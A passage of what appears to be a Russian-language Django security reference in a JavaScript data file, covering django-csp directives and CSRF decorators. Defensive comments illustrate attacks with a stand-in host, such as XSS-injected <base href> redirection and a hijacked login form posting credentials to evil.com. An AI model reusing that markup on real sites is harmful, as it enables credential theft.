      "Настройка django-csp: директива object-src — какие источники разрешены для тегов <object>, <embed> и <applet>. По умолчанию использует default-src. Современная рекомендация — всегда устанавливать в \"'none'\", т. к. эти теги используются для встраивания Flash/Java/PDF и являются вектором атак. Все современные форматы (видео, PDF) можно встраивать через <iframe> или <video>.",
    syntax: `# settings.py (django-csp <4.0)
CSP_OBJECT_SRC = ("'none'",)`,
    arguments: [],
    example: `# Рекомендуемая политика — пол_�ый запрет
CSP_OBJECT_SRC = ("'none'",)
# Заголовок: object-src 'none'
# Блокирует:
#   <object data="malicious.swf">
#   <embed src="malicious.pdf">
#   <applet code="evil.class">

# Если нужно встраивание PDF — лучше использовать <iframe> или <embed>
# с явным URL и frame-src/object-src:
CSP_OBJECT_SRC = ("'self'",)
# <embed src="/static/docs/manual.pdf" type="application/pdf">

# Для современных PDF-просмотрщиков (PDF.js) object-src не нужен:
# PDF.js загружает .pdf через fetch() → connect-src

# 'none' можно ставить даже когда default-src разрешает что-то,
# потому что директивы НЕ объединяются — самая специфичная побеждает:
CSP_DEFAULT_SRC = ("'self'", 'https:')
CSP_OBJECT_SRC  = ("'none'",)         # переопределяет default для <object>

# Атрибуты <object>/<embed> и <applet> устаревшие; современный фронтенд
# их не использует — установка 'none' практически ничего не сломает.`,
  },
  {
    name: "CSP_FRAME_SRC",
    category: "Content Security Policy",
    description:
      "Настройка django-csp: директива frame-src — какие источники разрешены для встраивания через <iframe src=...>. По умолчанию использует default-src. Используется при вставке YouTube-плееров, Google Maps, виджетов соцсетей, платёжных форм Stripe и т. п. Не путать с frame-ancestors (контролирует, кто может встраивать ВАШУ страницу) — frame-src контролирует, кого может встроить ВАША страница.",
    syntax: `# settings.py (django-csp <4.0)
CSP_FRAME_SRC = ("'self'", 'https://www.youtube.com')`,
    arguments: [],
    example: `# Запретить любые iframe — самая безопасная политика
CSP_FRAME_SRC = ("'none'",)

# Разрешить YouTube и платёжные формы Stripe
CSP_FRAME_SRC = (
    "'self'",
    'https://www.youtube.com',          # <iframe src="https://www.youtube.com/embed/...">
    'https://www.youtube-nocookie.com',
    'https://player.vimeo.com',
    'https://js.stripe.com',            # Stripe Elements (платёжные поля)
    'https://checkout.stripe.com',      # Stripe Checkout
    'https://www.google.com/maps/',     # встраиваемые карты
)

# Что покрывается:
# <iframe src="https://www.youtube.com/embed/XXX"></iframe>     ← youtube.com
# <iframe src="https://js.stripe.com/v3/elements-inner-payment.html"></iframe>
# <iframe src="/internal-page/"></iframe>                       ← 'self'
# <iframe srcdoc="<p>inline html</p>"></iframe>                 ← 'self'

# Различие frame-src и frame-ancestors:
#   frame-src         — кого МОЖЕМ встроить мы
#   frame-ancestors   — кто может встроить НАС (заменяет X-Frame-Options)
CSP_FRAME_SRC       = ('https://www.youtube.com',)   # встраиваем YouTube
CSP_FRAME_ANCESTORS = ("'none'",)                    # нас никто не встраивает`,
  },
  {
    name: "CSP_FRAME_ANCESTORS",
    category: "Content Security Policy",
    description:
      "Настройка django-csp: директива frame-ancestors — какие источники могут встраивать ВАШУ страницу через <iframe>, <frame>, <object>, <embed>. Современная замена устаревшего HTTP-заголовка X-Frame-Options. При наличии CSP frame-ancestors браузеры игнорируют X-Frame-Options. Поддерживает несколько источников (X-Frame-Options позволяет только один). Значение \"'none'\" эквивалентно X-Frame-Options: DENY, \"'self'\" — SAMEORIGIN.",
    syntax: `# settings.py (django-csp <4.0)
CSP_FRAME_ANCESTORS = ("'none'",)`,
    arguments: [],
    example: `# Полный запрет встраивания (рекомендуется для большинства страниц)
CSP_FRAME_ANCESTORS = ("'none'",)
# Эквивалент: X-Frame-Options: DENY

# Только свой домен — для внутренних виджетов и админки
CSP_FRAME_ANCESTORS = ("'self'",)
# Эквивалент: X-Frame-Options: SAMEORIGIN

# Несколько разрешённых доменов (X-Frame-Options так не умеет)
CSP_FRAME_ANCESTORS = (
    "'self'",
    'https://partner.com',
    'https://*.example-clients.com',     # любой поддомен
)
# Заголовок:
# Content-Security-Policy: frame-ancestors 'self' https://partner.com https://*.example-clients.com

# Различие frame-src и frame-ancestors:
#   frame-src         — кого могут встроить НАШИ страницы
#   frame-ancestors   — кто может встроить НАС
# Эти директивы независимы.

# Сосуществование с X-Frame-Options:
# Современные браузеры (Chrome, Firefox, Safari) при наличии CSP frame-ancestors
# ИГНОРИРУЮТ X-Frame-Options. Старые браузеры используют X-Frame-Options.
# Лучшая практика — выставлять оба заголовка для совместимости:
X_FRAME_OPTIONS = 'DENY'
CSP_FRAME_ANCESTORS = ("'none'",)

# default-src НЕ покрывает frame-ancestors — нужно задавать явно.`,
  },
  {
    name: "CSP_BASE_URI",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива base-uri — какие URL могут быть установлены в <base href="..."> элементе HTML. Тег <base> меняет базовый URL для всех относительных ссылок и запросов на странице. Атакующий, внедривший <base href="https://evil.com/"> через XSS, может перенаправить все ресурсы на свой домен. Рекомендуется всегда устанавливать "\'self\'" или "\'none\'". default-src НЕ покрывает base-uri.',
    syntax: `# settings.py (django-csp <4.0)
CSP_BASE_URI = ("'self'",)`,
    arguments: [],
    example: `# Рекомендуемая политика — только свой домен
CSP_BASE_URI = ("'self'",)

# Самая строгая — запретить <base> вообще
CSP_BASE_URI = ("'none'",)

# Атака, которую блокирует base-uri:
# Атакующий через XSS внедряет:
#   <base href="https://evil.com/static/">
# После этого все относительные пути на странице:
#   <script src="js/app.js">                  → https://evil.com/static/js/app.js
#   <link href="css/style.css">               → https://evil.com/static/css/style.css
#   fetch('api/data')                         → https://evil.com/static/api/data
# Все запросы уходят на сайт атакующего.
# С CSP base-uri 'self' — браузер игнорирует <base href="https://evil.com">.

# default-src НЕ применяется к base-uri:
CSP_DEFAULT_SRC = ("'self'", 'https:')   # ничего не даст для base-uri
CSP_BASE_URI    = ("'self'",)            # обязательно задать явно

# Если ваш сайт реально использует <base> с другим доменом (например,
# реверс-прокси с переписыванием путей):
CSP_BASE_URI = ("'self'", 'https://cdn.example.com')`,
  },
  {
    name: "CSP_FORM_ACTION",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива form-action — на какие URL могут отправляться HTML-формы (атрибут action в <form action="...">). Контролирует POST/GET-отправку форм. Защищает от атак, при которых злоумышленник через XSS подменяет action легитимной формы (например, формы логина) и крадёт данные на свой сервер. default-src НЕ покрывает form-action — нужно задавать явно. Рекомендуется "\'self\'" или явный список доверенных URL.',
    syntax: `# settings.py (django-csp <4.0)
CSP_FORM_ACTION = ("'self'",)`,
    arguments: [],
    example: `# Базовая политика — отправлять формы только на свой домен
CSP_FORM_ACTION = ("'self'",)

# С внешним обработчиком (например, Mailchimp подписка)
CSP_FORM_ACTION = (
    "'self'",
    'https://example.us12.list-manage.com',   # Mailchimp
    'https://hooks.zapier.com',               # Zapier webhooks
)

# Полный запрет всех форм (для read-only страниц)
CSP_FORM_ACTION = ("'none'",)

# Атака, которую блокирует form-action:
# Через XSS атакующий меняет форму логина:
#   <form action="https://evil.com/steal" method="post">
#     <input name="username">
#     <input name="password">
#     <button>Войти</button>
#   </form>
# При отправке логин/пароль уходят на evil.com.
# С CSP form-action 'self' — браузер блокирует POST на evil.com.

# Что покрывается:
# <form action="/login/" method="post">             ← 'self', OK
# <form action="https://evil.com/" method="post">   ← заблокировано
# <form>... </form>                                  ← без action = текущий URL = 'self'
# <input formaction="https://evil.com">             ← тоже проверяется

# default-src НЕ применяется к form-action — задавать ОБЯЗАТЕЛЬНО:
CSP_DEFAULT_SRC = ("'self'",)
CSP_FORM_ACTION = ("'self'",)        # без этого формы могут уходить куда угодно`,
  },
  {
    name: "CSP_SANDBOX",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива sandbox — применяет к загруженной странице ограничения, аналогичные атрибуту sandbox у <iframe>. Запрещает выполнение JavaScript, отправку форм, открытие popup, плагины, ввод pointer-lock и др. Можно перечислить «послабления»: allow-scripts, allow-forms, allow-popups, allow-same-origin, allow-modals, allow-top-navigation. Пустое значение CSP_SANDBOX = () означает «полная песочница без послаблений». В 4.0+ — DIRECTIVES["sandbox"].',
    syntax: `# settings.py (django-csp <4.0)
CSP_SANDBOX = ('allow-scripts', 'allow-same-origin')`,
    arguments: [],
    example: `# Полная песочница — максимальные ограничения
CSP_SANDBOX = ()
# Заголовок: Content-Security-Policy: sandbox
# Эффект:
#   - JavaScript отключён
#   - Формы не отправляются
#   - Popup-окна заблокированы
#   - Страница помещена в уникальный origin (нет доступа к cookie/localStorage)

# Песочница с послаблениями
CSP_SANDBOX = (
    'allow-scripts',         # разрешить JS
    'allow-same-origin',     # сохранить origin (доступ к cookie сайта)
    'allow-forms',           # разрешить отправку форм
    'allow-popups',          # разрешить window.open
    'allow-modals',          # разрешить alert/confirm/prompt
)
# Заголовок: sandbox allow-scripts allow-same-origin allow-forms allow-popups allow-modals

# Типичный сценарий — страница с user-generated HTML (предпросмотр поста)
CSP_SANDBOX = ('allow-same-origin',)   # без скриптов, без форм, без popup

# Применить только к конкретному view
from csp.decorators import csp_update

@csp_update(SANDBOX=[])     # legacy <4.0
def preview_user_html(request):
    return render(request, 'preview.html', {'html': request.user.draft})

# В 4.0+:
from csp.decorators import csp_update
@csp_update({'sandbox': ()})
def preview_user_html(request): ...`,
  },
  {
    name: "CSP_UPGRADE_INSECURE_REQUESTS",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: булева директива upgrade-insecure-requests. При True добавляет в заголовок флаг, заставляющий браузер автоматически переписывать все http:// URL на странице в https:// (для img, script, link, iframe, fetch и пр.). Полезно при миграции старого сайта на HTTPS, когда в БД и шаблонах остались жёсткие http://-ссылки. Не выполняет редирект самих переходов — только переписывает ресурсы внутри страницы. В 4.0+ — DIRECTIVES["upgrade-insecure-requests"].',
    syntax: `# settings.py (django-csp <4.0)
CSP_UPGRADE_INSECURE_REQUESTS = True`,
    arguments: [],
    example: `# settings.py
CSP_UPGRADE_INSECURE_REQUESTS = True
# Заголовок: Content-Security-Policy: upgrade-insecure-requests

# Эффект для страницы https://example.com/article/:
# <img src="http://cdn.example.com/old.jpg">
#   → браузер автоматически грузит https://cdn.example.com/old.jpg
# <script src="http://api.example.com/widget.js">
#   → автоматически https://api.example.com/widget.js
# fetch('http://api.example.com/data')
#   → автоматически https://api.example.com/data

# Что НЕ переписывается:
# 1. Переходы по ссылкам пользователя — <a href="http://...">
#    (требует HSTS или ручного редиректа на сервере)
# 2. Запросы с других страниц
# 3. Картинки с http://other-domain.com (если HTTPS-версии нет)
#    — браузер попробует https и получит ошибку

# Сценарий миграции на HTTPS:
#   1. Включить HTTPS на сервере
#   2. CSP_UPGRADE_INSECURE_REQUESTS = True
#       → все ресурсы внутри страниц автоматически HTTPS
#   3. Постепенно почистить старые http://-ссылки в БД
#   4. Включить HSTS:
SECURE_HSTS_SECONDS = 31536000  # год
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# В 4.0+:
CONTENT_SECURITY_POLICY = {
    'DIRECTIVES': {
        'upgrade-insecure-requests': True,
    },
}`,
  },
  {
    name: "CSP_BLOCK_ALL_MIXED_CONTENT",
    category: "Content Security Policy",
    description:
      "Настройка django-csp: булева директива block-all-mixed-content (УСТАРЕЛА). При True добавляет в заголовок флаг, блокирующий ВСЕ mixed-content запросы (загрузку HTTP-ресурсов на HTTPS-странице) — без попытки upgrade. Современные браузеры (с 2020 г.) блокируют active mixed content (script/iframe) автоматически независимо от этой директивы, а passive (img/audio/video) предпочитают апгрейдить через upgrade-insecure-requests. В CSP Level 3 директива удалена.",
    syntax: `# settings.py (django-csp <4.0)
CSP_BLOCK_ALL_MIXED_CONTENT = True`,
    arguments: [],
    example: `# settings.py
CSP_BLOCK_ALL_MIXED_CONTENT = True
# Заголовок: Content-Security-Policy: block-all-mixed-content

# Эффект для страницы https://example.com/article/:
# <img src="http://example.com/photo.jpg">     ← заблокирован (вместо upgrade)
# <script src="http://api.example.com/x.js">   ← заблокирован
# fetch('http://api.example.com/data')         ← заблокирован

# Отличие от upgrade-insecure-requests:
#   block-all-mixed-content       → жёсткая блокировка (ресурс не загружается)
#   upgrade-insecure-requests     → попытка переписать http → https

# Современная рекомендация — НЕ использовать block-all-mixed-content,
# вместо неё применять upgrade-insecure-requests:
CSP_UPGRADE_INSECURE_REQUESTS = True
# а active mixed content браузер заблокирует и без CSP.

# Если оба заголовка указаны вместе, block-all-mixed-content имеет приоритет
# (ничего не апгрейдится, всё блокируется).

# Директива официально удалена в CSP Level 3 (W3C WD).
# В новом коде использовать НЕ рекомендуется.`,
  },
  {
    name: "CSP_REFERRER",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива referrer (УСТАРЕЛА в CSP 2). Управляет содержимым HTTP-заголовка Referer, отправляемого с исходящих запросов. Допустимые значения: "no-referrer", "no-referrer-when-downgrade", "origin", "origin-when-cross-origin", "same-origin", "strict-origin", "strict-origin-when-cross-origin", "unsafe-url". Современная замена — отдельный HTTP-заголовок Referrer-Policy (в Django настраивается через SecurityMiddleware и SECURE_REFERRER_POLICY).',
    syntax: `# settings.py (django-csp <4.0)
CSP_REFERRER = 'strict-origin-when-cross-origin'`,
    arguments: [],
    example: `# Устаревший способ через CSP
CSP_REFERRER = 'strict-origin-when-cross-origin'
# Заголовок: Content-Security-Policy: referrer strict-origin-when-cross-origin

# Возможные значения:
#   'no-referrer'                       — никогда не отправлять Referer
#   'no-referrer-when-downgrade'        — не отправлять при HTTPS→HTTP
#   'origin'                            — только схема+хост (без пути)
#   'origin-when-cross-origin'          — полный URL для same-origin, только origin для cross
#   'same-origin'                       — только для запросов на свой домен
#   'strict-origin'                     — origin, но не при HTTPS→HTTP
#   'strict-origin-when-cross-origin'   — рекомендуемый default браузеров
#   'unsafe-url'                        — всегда полный URL (опасно)

# Современный способ — отдельный заголовок Referrer-Policy через Django
# settings.py
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'
# Заголовок: Referrer-Policy: strict-origin-when-cross-origin
# (выставляется django.middleware.security.SecurityMiddleware)

# Ещё точечнее — мета-тег в шаблоне:
# <meta name="referrer" content="no-referrer">

# Или атрибут на конкретном элементе:
# <a href="https://example.com" referrerpolicy="no-referrer">link</a>
# <img src="..." referrerpolicy="origin">

# Рекомендация: НЕ использовать CSP_REFERRER в новом коде,
# вместо неё — SECURE_REFERRER_POLICY.`,
  },
  {
    name: "CSP_CHILD_SRC",
    category: "Content Security Policy",
    description:
      "Настройка django-csp: директива child-src — какие источники разрешены для вложенных контекстов: <iframe>, <frame> и Web Workers. В CSP 2 заменила собой frame-src; в CSP 3 child-src разделена обратно на frame-src (только iframe/frame) и worker-src (только Web/Service/Shared Workers). Современные браузеры предпочитают frame-src и worker-src, но при их отсутствии используют child-src как fallback. По умолчанию — default-src.",
    syntax: `# settings.py (django-csp <4.0)
CSP_CHILD_SRC = ("'self'", 'https://www.youtube.com')`,
    arguments: [],
    example: `# Универсальная политика — покрывает и iframe, и worker
CSP_CHILD_SRC = (
    "'self'",
    'https://www.youtube.com',          # iframe c YouTube
    'https://api.example.com',          # Service Worker с API
)

# Современный подход — раздельно frame-src и worker-src:
CSP_FRAME_SRC  = ("'self'", 'https://www.youtube.com')
CSP_WORKER_SRC = ("'self'",)
# В этом случае child-src можно вообще не задавать — браузер использует
# frame-src и worker-src напрямую.

# Когда полезен child-src:
# 1. Совместимость со старыми браузерами (CSP 2)
# 2. Когда правила одинаковые и для iframe, и для worker
CSP_CHILD_SRC = ("'self'",)

# Иерархия наследования:
#   <iframe>           → frame-src → child-src → default-src
#   Worker             → worker-src → child-src → default-src
#   <object>/<embed>   → object-src → default-src   (НЕ через child-src)

# Что покрывается child-src:
# <iframe src="https://allowed.com/page">              ← child-src
# new Worker('/static/js/worker.js')                   ← child-src
# new SharedWorker('/static/js/shared.js')             ← child-src
# navigator.serviceWorker.register('/sw.js')           ← child-src`,
  },
  {
    name: "CSP_WORKER_SRC",
    category: "Content Security Policy",
    description:
      "Настройка django-csp: директива worker-src — какие источники разрешены для скриптов Web Worker, Shared Worker и Service Worker. Введена в CSP 3 как отдельная директива от child-src. По умолчанию использует child-src, затем default-src. Service Worker особенно критичен — он перехватывает все сетевые запросы страницы, поэтому источники должны быть строго ограничены, обычно только \"'self'\".",
    syntax: `# settings.py (django-csp <4.0)
CSP_WORKER_SRC = ("'self'",)`,
    arguments: [],
    example: `# Рекомендуемая политика — только свой домен
CSP_WORKER_SRC = ("'self'",)
# Service Worker и Web Worker могут загружаться только с собственного домена
# Это критично, потому что Service Worker перехватывает запросы страницы.

# Запретить worker'ы полностью
CSP_WORKER_SRC = ("'none'",)
# Блокирует:
#   new Worker('...')
#   new SharedWorker('...')
#   navigator.serviceWorker.register('...')

# С blob: для динамически создаваемых worker'ов
CSP_WORKER_SRC = ("'self'", 'blob:')
# Разрешает:
# const code = "self.onmessage = e => self.postMessage(e.data * 2);";
# const blob = new Blob([code], {type: 'application/javascript'});
# const worker = new Worker(URL.createObjectURL(blob));   ← blob:

# Иерархия наследования (CSP 3):
#   Worker → worker-src → child-src → default-src

# Пример полной конфигурации
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'", 'https://cdn.example.com')   # обычные скрипты
CSP_WORKER_SRC  = ("'self'",)                              # worker'ы строже
CSP_CHILD_SRC   = ("'self'",)                              # для старых браузеров

# Что покрывается:
# new Worker('/static/js/worker.js')                       ← worker-src
# new SharedWorker('/static/js/shared.js')                 ← worker-src
# navigator.serviceWorker.register('/sw.js')               ← worker-src
# importScripts('https://cdn.example.com/lib.js')          ← script-src внутри Worker`,
  },
  {
    name: "CSP_MANIFEST_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива manifest-src — какие источники разрешены для файла Web App Manifest (<link rel="manifest" href="/manifest.json">). Manifest описывает PWA: имя, иконки, цвет темы, start_url, display-mode. По умолчанию использует default-src. Обычно достаточно "\'self\'", т. к. manifest почти всегда хостится на собственном домене сайта.',
    syntax: `# settings.py (django-csp <4.0)
CSP_MANIFEST_SRC = ("'self'",)`,
    arguments: [],
    example: `# Стандартная политика для PWA
CSP_MANIFEST_SRC = ("'self'",)
# Разрешает: <link rel="manifest" href="/manifest.json">

# Запретить manifest полностью (если сайт не PWA)
CSP_MANIFEST_SRC = ("'none'",)

# Иконки и другие ресурсы из manifest проверяются по своим директивам:
# manifest.json:
# {
#   "name": "Мой PWA",
#   "icons": [
#     {"src": "/static/icons/192.png"}    ← img-src
#   ],
#   "start_url": "/",                       ← navigate-to (если задан)
#   "background_color": "#fff"
# }

# То есть для PWA нужны как минимум:
CSP_DEFAULT_SRC  = ("'self'",)
CSP_MANIFEST_SRC = ("'self'",)        # сам manifest.json
CSP_IMG_SRC      = ("'self'",)        # иконки
CSP_SCRIPT_SRC   = ("'self'",)        # service worker и приложение
CSP_WORKER_SRC   = ("'self'",)        # service worker

# urls.py для отдачи manifest
# urlpatterns = [
#     path('manifest.json', TemplateView.as_view(
#         template_name='manifest.json',
#         content_type='application/manifest+json',
#     )),
# ]`,
  },
  {
    name: "CSP_PREFETCH_SRC",
    category: "Content Security Policy",
    description:
      'Настройка django-csp: директива prefetch-src (УСТАРЕЛА). Контролировала источники для предзагрузки ресурсов через <link rel="prefetch">, <link rel="prerender"> и Speculation Rules API. Удалена из спецификации CSP 3 в 2020 г.; современные браузеры её игнорируют (Chrome убрал поддержку в 113). Источники prefetch теперь проверяются по соответствующей директиве типа ресурса (img-src для картинок, script-src для скриптов и т. д.). В новом коде НЕ использовать.',
    syntax: `# settings.py (django-csp <4.0, deprecated)
CSP_PREFETCH_SRC = ("'self'",)`,
    arguments: [],
    example: `# settings.py — deprecated
CSP_PREFETCH_SRC = ("'self'", 'https://cdn.example.com')
# Заголовок: Content-Security-Policy: prefetch-src 'self' https://cdn.example.com
# Большинство современных браузеров (Chrome 113+, Firefox) ИГНОРИРУЮТ.

# Современная альтернатива — проверка по типу ресурса:
# <link rel="prefetch" href="/static/img/next.jpg">
#   → проверяется по img-src

# <link rel="prefetch" href="/static/js/page2.js">
#   → проверяется по script-src

# <link rel="prerender" href="https://other.com/">
#   → проверяется по navigate-to / connect-src (зависит от браузера)

# Speculation Rules API:
# <script type="speculationrules">
#   { "prerender": [{ "source": "list", "urls": ["/page2/"] }] }
# </script>
#   → проверяется по соответствующим директивам ресурса

# Если по какой-то причине нужно явно ограничить prefetch:
# Используйте rel-атрибуты в HTML-шаблонах сами, без CSP-директивы.

# В новом коде НЕ задавать prefetch-src.
# В django-csp 4.0+ директива тоже доступна, но не имеет эффекта в современных
# браузерах:
CONTENT_SECURITY_POLICY = {
    'DIRECTIVES': {
        # 'prefetch-src': ("'self'",),   # бесполезно — оставить пустым
    },
}`,
  },
  {
    name: "CSP_NAVIGATE_TO",
    category: "Content Security Policy",
    description:
      "Настройка django-csp: директива navigate-to (НЕ ВНЕДРЕНА в браузерах). Согласно черновику CSP 3 должна была контролировать, на какие URL можно навигировать (переходы по <a href>, window.location =, form submission, window.open). Из-за сложности реализации и пересечения с form-action ни один основной браузер её не поддерживает. В августе 2022 удалена из спецификации Living Standard. В новом коде НЕ использовать.",
    syntax: `# settings.py (django-csp, не работает в браузерах)
CSP_NAVIGATE_TO = ("'self'",)`,
    arguments: [],
    example: `# settings.py — теоретическая директива, в браузерах НЕ работает
CSP_NAVIGATE_TO = ("'self'", 'https://partner.com')
# Заголовок: Content-Security-Policy: navigate-to 'self' https://partner.com
# Эффекта в Chrome/Firefox/Safari НЕ имеет.

# Что директива должна была покрывать (по черновику):
# <a href="https://evil.com">link</a>            → должна была блокироваться
# <form action="https://evil.com" method="post"> → блокируется form-action
# window.location = 'https://evil.com'           → должна была блокироваться
# window.open('https://evil.com')                → должна была блокироваться

# Реальные альтернативы для контроля переходов:
# 1. form-action — для отправки форм
CSP_FORM_ACTION = ("'self'",)

# 2. base-uri — против <base href> атак
CSP_BASE_URI = ("'self'",)

# 3. На уровне приложения — серверная валидация redirect-параметров:
from django.utils.http import url_has_allowed_host_and_scheme

def safe_redirect(request):
    next_url = request.GET.get('next', '/')
    if not url_has_allowed_host_and_scheme(next_url, allowed_hosts={request.get_host()}):
        next_url = '/'
    return redirect(next_url)

# 4. Для open-redirect защиты — не передавать произвольные URL в location.

# В новом коде НЕ задавать navigate-to. Если она присутствовала раньше —
# можно безопасно удалить, ничего не сломается.`,
  },
  {
    name: "CsrfViewMiddleware",
    category: "Cross Site Request Forgery protection",
    description:
      "Класс django.middleware.csrf.CsrfViewMiddleware — middleware, реализующий защиту от CSRF-атак (Cross-Site Request Forgery). Для каждого «небезопасного» запроса (POST, PUT, PATCH, DELETE) проверяет наличие и валидность CSRF-токена в форме (поле csrfmiddlewaretoken) или в HTTP-заголовке (X-CSRFToken по умолчанию). Сам токен хранится в cookie csrftoken (или в сессии, если CSRF_USE_SESSIONS=True). При несовпадении вызывает CSRF_FAILURE_VIEW (по умолчанию 403 Forbidden). Включён по умолчанию в новом проекте Django.",
    syntax: `# settings.py
MIDDLEWARE = [
    ...,
    'django.middleware.csrf.CsrfViewMiddleware',
]`,
    arguments: [],
    example: `# settings.py
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',     # CSRF-защита
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    ...,
]

# Алгоритм проверки на каждом небезопасном запросе:
#   1. Если метод GET/HEAD/OPTIONS/TRACE → пропустить (safe methods)
#   2. Если view помечен @csrf_exempt → пропустить
#   3. Сравнить Origin/Referer заголовок с ALLOWED_HOSTS + CSRF_TRUSTED_ORIGINS
#   4. Получить токен из cookie (или сессии)
#   5. Получить токен из POST['csrfmiddlewaretoken'] или из заголовка X-CSRFToken
#   6. Сравнить через constant_time_compare()
#   7. Несовпадение → 403 Forbidden (или CSRF_FAILURE_VIEW)

# В шаблоне формы — обязательный тег:
# <form method="post">
#   {% csrf_token %}     ← вставит <input type="hidden" name="csrfmiddlewaretoken" value="...">
#   ...
# </form>

# Для AJAX/fetch — токен из cookie:
# const token = document.cookie.split('csrftoken=')[1].split(';')[0];
# fetch('/api/', {
#   method: 'POST',
#   headers: {'X-CSRFToken': token, 'Content-Type': 'application/json'},
#   body: JSON.stringify(data),
# });

# Отключение для конкретной view (НЕ рекомендуется для форм с side-effects):
from django.views.decorators.csrf import csrf_exempt
@csrf_exempt
def webhook(request): ...   # внешний сервис без CSRF-токена`,
  },
  {
    name: "get_token(request)",
    category: "Cross Site Request Forgery protection",
    description:
      "Функция django.middleware.csrf.get_token(request), возвращающая текущий CSRF-токен для запроса. Помечает запрос флагом, чтобы CsrfViewMiddleware гарантированно отправил cookie csrftoken в ответе (даже если шаблонный тег {% csrf_token %} не был использован). Используется в JS-обработчиках, при формировании ответа JSON-API, который потом будет отправлять небезопасные запросы, и в декораторе ensure_csrf_cookie.",
    syntax:
      "from django.middleware.csrf import get_token\ntoken = get_token(request)",
    arguments: [
      {
        name: "request",
        description:
          "Объект HttpRequest текущего запроса. Функция помечает request, чтобы middleware гарантированно установил cookie csrftoken в ответе.",
      },
    ],
    example: `from django.middleware.csrf import get_token
from django.http import JsonResponse

# 1. Передать токен в JSON-ответ для последующих fetch-запросов
def get_csrf(request):
    return JsonResponse({'csrftoken': get_token(request)})

# urls.py: path('api/csrf/', get_csrf)
# JavaScript:
#   const r = await fetch('/api/csrf/');
#   const {csrftoken} = await r.json();
#   await fetch('/api/post/', {
#       method: 'POST',
#       headers: {'X-CSRFToken': csrftoken},
#       body: JSON.stringify(...),
#   });

# 2. Эквивалент шаблонного тега {% csrf_token %} в Python-коде:
def manual_form(request):
    token = get_token(request)
    html = f'<input type="hidden" name="csrfmiddlewaretoken" value="{token}">'
    ...

# 3. Отличие от {% csrf_token %}:
#   {% csrf_token %} — рендерит готовый <input> и вызывает get_token() внутри
#   get_token(request) — только возвращает строку и помечает request
#   В обоих случаях CsrfViewMiddleware отправит cookie csrftoken в ответе

# 4. Без get_token() / {% csrf_token %} cookie csrftoken НЕ устанавливается,
#    и первый POST-запрос на следующей странице упадёт с 403.
#    Решение — декоратор @ensure_csrf_cookie:
from django.views.decorators.csrf import ensure_csrf_cookie

@ensure_csrf_cookie
def home(request):
    # Гарантированно отдаст cookie csrftoken даже без {% csrf_token %}
    return render(request, 'home.html')`,
  },
  {
    name: "csrf_exempt(view)",
    category: "Cross Site Request Forgery protection",
    description:
      "Декоратор django.views.decorators.csrf.csrf_exempt — отключает CSRF-проверку для конкретного представления. После применения CsrfViewMiddleware пропускает любые запросы к этой view без валидации токена. Используется для webhook-эндпоинтов внешних сервисов (Stripe, GitHub, Telegram), которые не могут передать CSRF-токен. Применять с осторожностью: на view с побочными эффектами (создание/удаление данных) обязательна альтернативная защита — подпись запроса, IP-allowlist, секретный токен в URL/заголовке.",
    syntax: `from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def webhook(request):
    ...`,
    arguments: [
      {
        name: "view",
        description:
          "Декорируемая view-функция. Декоратор устанавливает атрибут csrf_exempt = True на view; CsrfViewMiddleware видит флаг и пропускает проверку.",
      },
    ],
    example: `import json
import hmac, hashlib
from django.conf import settings
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST
from django.http import HttpResponse, HttpResponseForbidden
from django.utils.decorators import method_decorator
from django.views import View

# Webhook от внешнего сервиса с проверкой подписи (Stripe, GitHub style)
@csrf_exempt
@require_POST
def stripe_webhook(request):
    sig = request.headers.get('Stripe-Signature', '')
    expected = hmac.new(
        settings.STRIPE_WEBHOOK_SECRET.encode(),
        request.body,
        hashlib.sha256,
    ).hexdigest()
    if not hmac.compare_digest(sig, expected):
        return HttpResponseForbidden('Invalid signature')

    payload = json.loads(request.body)
    handle_event(payload)
    return HttpResponse(status=200)

# CBV — через method_decorator
@method_decorator(csrf_exempt, name='dispatch')
class TelegramWebhookView(View):
    def post(self, request):
        update = json.loads(request.body)
        process_telegram_update(update)
        return HttpResponse('OK')

# ВАЖНО: csrf_exempt — это полное отключение защиты. Без альтернативной
# проверки (signature, secret в URL, IP-фильтр) view становится уязвимой:
# любой сайт может отправить POST через <form> и вызвать побочные эффекты.

# НЕ использовать csrf_exempt для:
#   - форм, которые отправляются из браузера пользователя
#   - JSON-API, к которым обращаются ваши же фронтенд-страницы
#     → используйте {% csrf_token %} + X-CSRFToken вместо отключения`,
  },
  {
    name: "csrf_protect(view)",
    category: "Cross Site Request Forgery protection",
    description:
      "Декоратор django.views.decorators.csrf.csrf_protect — принудительно включает CSRF-защиту для конкретной view. Полезен, когда CsrfViewMiddleware отключён глобально (например, проект использует другую модель защиты, но отдельные view нужно защитить), либо когда в URLconf подключается view, не проходящий через middleware. По умолчанию защита и так включена для всех view, поэтому декоратор обычно избыточен.",
    syntax: `from django.views.decorators.csrf import csrf_protect

@csrf_protect
def my_view(request):
    ...`,
    arguments: [
      {
        name: "view",
        description:
          "Декорируемая view-функция. Декоратор оборачивает view в логику CSRF-проверки, идентичную той, что выполняет CsrfViewMiddleware.",
      },
    ],
    example: `from django.views.decorators.csrf import csrf_protect
from django.utils.decorators import method_decorator
from django.views import View
from django.shortcuts import render, redirect

# Случай 1: CsrfViewMiddleware отключён в settings.MIDDLEWARE,
# но эту конкретную view нужно защитить
@csrf_protect
def transfer_money(request):
    if request.method == 'POST':
        do_transfer(request.POST)
        return redirect('success')
    return render(request, 'transfer.html')

# Случай 2: CBV через method_decorator
@method_decorator(csrf_protect, name='dispatch')
class TransferView(View):
    def post(self, request):
        do_transfer(request.POST)
        return redirect('success')

# Случай 3: view, ранее декорированная @csrf_exempt, но позже оказалось,
